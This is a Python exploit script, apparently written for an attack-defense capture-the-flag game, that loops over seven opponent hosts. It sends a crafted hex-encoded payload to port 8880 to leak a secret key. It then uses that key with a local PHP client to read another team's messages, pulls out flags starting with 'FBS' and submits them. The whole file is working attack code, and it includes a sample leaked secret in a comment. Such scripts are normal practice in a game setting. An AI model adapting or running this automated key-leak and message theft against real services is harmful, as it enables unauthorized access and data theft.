import requests
import json
import subprocess

targets = ["paradoxan", "krongdi", "xondoras", "brocktan", "elgon", "gardari", "xren"]
prefix = "transport.cob."

payload = "?data=0106006662735f6f70040700636f6e66696700010b006662735f76657273696f6e0204002a000000010e006662735f6d6573736167655f696403100036666564333538663165646566393833010c006662735f656e76656c6f70650451003c3f786d6c2076657273696f6e3d27312e30273f3e0a3c6662732d656e76656c6f70653e0a202020203c726571756573743e0a202020203c2f726571756573743e0a3c2f6662732d656e76656c6f70653e&signature=010d006662735f7369676e617475726504010031"

for target in targets:
	#print(f"Result for {target}")
	response = requests.get(f"http://{prefix}{target}:8880{payload}", timeout=5)
	#print(response.text)
    
	#tukaj pride potem naprej koda
	#json_data = json.loads(response.text)
    

	#respons = '''{"age":"FBS0000: operation succeeded","message_id":"6fed358f1edef983","data":{"secret":"0u7eUs3fNniEQvOVVOMXlDGLdcnCuoFaXM6PUB5QjFRR1Ifo0dHY4RXazcZO6SOz","private_target_list":["LeviathanEye","CerberusSpear","NautilusStrike","ScimitarShadow","ThunderHammer","ShadowFang","TempestSentinel","NebulaFall","NautilusStar","OceanWrath","SkyPhoenix","DragonFall","TitanHunter","SpecterWarden","SkyRoar","ThunderSentinel","NightWatch"],"redis":{"host":"redis"}}}'''
	    
	#json_data = json.loads(respons)

	try:
		json_data = json.loads(response.text)
		secret_key = json_data["data"]["secret"]
		if secret_key != "":

			#print(f"./fbs_client.php --secret={secret_key} {prefix}{target} recv NightWatch")
			msg = subprocess.run(f"./fbs_client.php --secret={secret_key} {prefix}{target} recv NightWatch", shell=True, capture_output=True, text=True)
			#message = msg.stdout
			#print("message here")
			message = msg.stdout.strip()
			#print(message)
	except:
		secret_key= "empty"
		message = "not what we want"
	
	#print(secret_key)
	#print("message here")
	#print(message)

	#./fbs_client.php --secret=secret_key {prefix}{target} recv NightWatch
	#print(f"./fbs_client.php --secret={secret_key} {prefix}{target} recv NightWatch")
	#message = subprocess.call(f"./fbs_client.php --secret={secret_key} {prefix}{target} recv NightWatch", shell=True)


	if message!="not what we want":
		try:
			#print("inside try json message")
			json_message = json.loads(message)
			#print(json_message)
			msg_key = json_message["data"][5].split()[5].replace(".","")
			

			#submit the flag
			#print(f"fbs_sugmit {msg_key}")
			if msg_key.startswith('FBS'):
				subprocess.call(f"submit_fbs {msg_key}", shell=True)
		except:
			print("flag not submited")

